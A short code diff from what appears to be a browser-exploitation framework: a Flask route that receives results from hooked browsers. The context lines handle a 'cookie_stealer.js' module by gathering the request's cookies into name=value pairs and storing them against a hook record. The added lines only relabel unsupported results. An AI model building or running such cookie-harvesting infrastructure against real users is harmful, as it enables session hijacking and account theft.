@@ -54,6 +54,9 @@ def result_listener():
     if module_value == 'cookie_stealer.js':
         result = ',\n'.join([f'{name}={value}' for name, value in request.cookies.items()])
 
+    if result == 'undefined':
+        result = 'Not supported in this browser'
+
     from ..hook.models import Hook
     column = Module.get_module_as_db_column(module_value)
     curr_hook = Hook.query.filter(Hook.id == hook_id).first_or_404()
